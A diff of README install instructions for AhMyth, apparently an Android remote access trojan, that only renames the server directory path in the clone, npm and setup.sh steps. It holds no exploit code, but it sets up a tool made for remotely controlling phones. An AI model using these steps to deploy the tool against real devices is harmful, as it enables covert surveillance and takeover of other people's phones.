@@ -4,14 +4,14 @@
 ### You have two options to install it
 #### 1) Git Clone the Repository and follow the instructions
 1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
-2. ```cd AhMyth-Android-RAT/AhMyth-Server```
+2. ```cd AhMyth/AhMyth-Server```
 3. ```npm install && npm audit fix```
 4. ```npm start```
 
 #### 2) Run the setup file inside the AhMyth-Server folder (RECOMENDED FOR KALI USERS)
 The `setup.sh` file located inside `AhMyth/AhMyth-Server` also 
 installs the correct openJDK version needed for AhMyth to work properly
-1. ```cd AhMyth-Android-RAT/AhMyth-Server```
+1. ```cd AhMyth/AhMyth-Server```
 2. ```chmod +x setup.sh```
 3. ```sudo ./setup.sh```
 4. ```update-alternatives --config java``` - Select the corresponding number for OpenJDK-8-JDK
